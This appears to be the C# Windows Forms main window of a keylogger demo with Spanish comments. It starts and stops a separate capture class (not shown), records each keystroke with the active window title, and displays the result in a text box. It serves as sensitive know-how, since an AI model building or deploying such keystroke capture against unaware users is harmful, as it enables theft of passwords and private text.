using System;
using System.Windows.Forms;

namespace KeyLogger
{
	/// <summary>
	///		Ventana principal de la aplicación
	/// </summary>
	public partial class frmMain : Form
	{
		// Variables privadas
		private string _lastWindow;
		private KeyLoggerManager _keyLogManager;

		public frmMain()
		{
			InitializeComponent();
		}

		/// <summary>
		///		Inicializa el formulario
		/// </summary>
		private void InitForm()
		{
			_keyLogManager = new KeyLoggerManager();
			_keyLogManager.KeyPressed += (sender, evntArgs) => TreatKey(evntArgs.WindowTitle, evntArgs.KeyCode);
		}

		/// <summary>
		///		Trata la pulsación de una tecla
		/// </summary>
		private void TreatKey(string windowTitle, int keyCode)
		{
			// Si se ha cambiado de ventana, se añade al log
			if (string.IsNullOrWhiteSpace(_lastWindow) || !windowTitle.Equals(_lastWindow))
			{
				_lastWindow = windowTitle;
				AddLogLine(_lastWindow);
			}
			// Añade el carácter
			AddLogChar(keyCode);
		}

		/// <summary>
		///		Arranca el keyLogger
		/// </summary>
		private void StartKeyLogger()
		{
			_keyLogManager.Start();
			AddLogLine("KeyLogger --> Start");
		}

		/// <summary>
		///		Detiene el keyLogger
		/// </summary>
		private void StopKeyLogger()
		{
			_keyLogManager.Stop();
			_lastWindow = string.Empty;
			AddLogLine("KeyLogger --> Stop");
		}

		/// <summary>
		///		Añade una línea al cuadro de texto
		/// </summary>
		private void AddLogLine(string message)
		{
			txtLog.AppendText(Environment.NewLine + message + Environment.NewLine);
			txtLog.AppendText(new string('-', 80) + Environment.NewLine);
		}

		/// <summary>
		///		Añade el carácter
		/// </summary>
		private void AddLogChar(int keyCode)
		{
			string converted = ConvertKeyCode(keyCode);

				// Añade el 'carácter' convertido
				if (!string.IsNullOrEmpty(converted))
					txtLog.AppendText(converted);
		}

		/// <summary>
		///		Convierte un keyCode en una cadena
		/// </summary>
		private string ConvertKeyCode(int keyCode)
		{
			switch ((Keys) keyCode)
			{
				case Keys.Enter:
					return Environment.NewLine;
				case Keys.Space:
					return " ";
				case Keys.OemPeriod:
					return ".";
				case Keys.Back:
					return "{BACK}";
				case Keys.Delete:
					return "{SUPR}";
				case Keys.LShiftKey:
				case Keys.RShiftKey:
					return "{SHIFT}";
				case Keys.Capital:
					return "{CAPS}";
				case Keys.Alt:
				case Keys.LMenu:
				case Keys.RMenu:
					return "{ALT}";
				case Keys.Control:
				case Keys.LControlKey:
				case Keys.RControlKey:
					return "{CTL}";
				case Keys.Oem7:
					return "'";
				case Keys.Oemcomma:
					return ",";
				default:
					string value = ((Keys) keyCode).ToString();

						if (value.Length > 1)
							return $"{{{value}}}";
						else
							return value;
			}
		}

		private void frmMain_Load(object sender, EventArgs e)
		{
			InitForm();
		}

		private void cmdStart_Click(object sender, EventArgs e)
		{
			StartKeyLogger();
		}

		private void cmdStop_Click(object sender, EventArgs e)
		{
			StopKeyLogger();
		}
	}
}
